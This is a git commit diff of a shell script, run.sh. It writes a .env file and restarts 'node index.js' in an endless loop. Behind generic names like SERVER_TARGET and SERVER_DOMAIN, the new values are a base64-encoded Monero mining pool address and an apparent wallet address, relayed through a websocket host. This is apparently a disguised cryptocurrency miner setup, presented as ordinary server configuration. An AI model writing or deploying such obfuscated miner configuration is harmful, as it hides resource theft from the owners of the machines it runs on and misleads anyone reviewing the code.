87b0f44ba8a383e40a98308f7f25603ae4f31846
anangharis510sksm <anangharis510@gmail.com>
2026-02-03 09:22:47 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
-CONNECT=$1
-NAME=$2
-echo "SERVER_WS=wss://cloud9one.biz.id
-SERVER_TARGET=czEuZGFwaXRheC5zb2NpYWw6ODA4Mg==
-SERVER_DOMAIN=${NAME}
-SERVER_SECRET=secret
+CONNECT=${1:-8}
+NAME=${2:-004}
+echo "SERVER_WS=ws://cdn.medco.cyou
+SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTo4MA==
+SERVER_DOMAIN=84GbAidJhw8cxCq941aeTd7zHL5uJ5XhzLHgWUX3eQ4VfHoswB3Dx1edeWCpxJRKx53bTLEzVdGeJFNCPQ5o1BMKJdqH2C4
+SERVER_SECRET=${NAME}
 SERVER_CONNECTION=${CONNECT}" > .env
 while true; do node index.js; sleep 15; done
